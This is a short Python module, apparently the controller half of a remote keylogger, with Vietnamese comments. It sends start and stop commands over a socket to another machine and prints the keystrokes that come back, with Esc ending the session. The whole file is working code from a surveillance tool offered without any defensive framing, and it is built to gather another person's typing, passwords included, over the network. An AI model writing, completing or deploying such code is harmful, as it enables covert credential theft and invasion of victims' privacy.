# key_logger.py
from pynput import keyboard

# Biến trạng thái keylogger
keylogger_running = False

def key_logger(client_socket):
    print("Connected to the server. Listening for keystrokes... (Press 'Esc' to stop)")

    def on_press(key):
        # Stop the keylogger locally and notify the server when 'Esc' is pressed
        if key == keyboard.Key.esc:
            client_socket.sendall("STOP_KEY_LOGGER".encode())
            print("Sent command to stop keylogger.")
            return False
        else:
            print(f'Key {key} pressed')  # For debugging

    with keyboard.Listener(on_press=on_press) as listener:
        try:
            while True:
                # Nhận dữ liệu từ server
                data = client_socket.recv(1024)
                decoded_data = data.decode("utf-8")

                # Kiểm tra và không in thông báo nếu là lệnh KEYLOGGER_STOPPED
                if decoded_data == "KEYLOGGER_STOPPED":
                    print("Keylogger stopped by server. Returning to main menu...")
                    break

                if not data:
                    print("No more data received. Exiting...")
                    break
                print(decoded_data, end='')  # Print received keystrokes
        except Exception as e:
            print(f"Error receiving data: {e}")

    listener.join()  # Wait for the listener to finish

def toggle_key_logger(client_socket):
    global keylogger_running
    if not keylogger_running:
        client_socket.sendall("START_KEY_LOGGER".encode())
        print("Starting keylogger...")
        keylogger_running = True
        key_logger(client_socket)
    else:
        client_socket.sendall("STOP_KEY_LOGGER".encode())
        print("Stopping keylogger...")
        keylogger_running = False

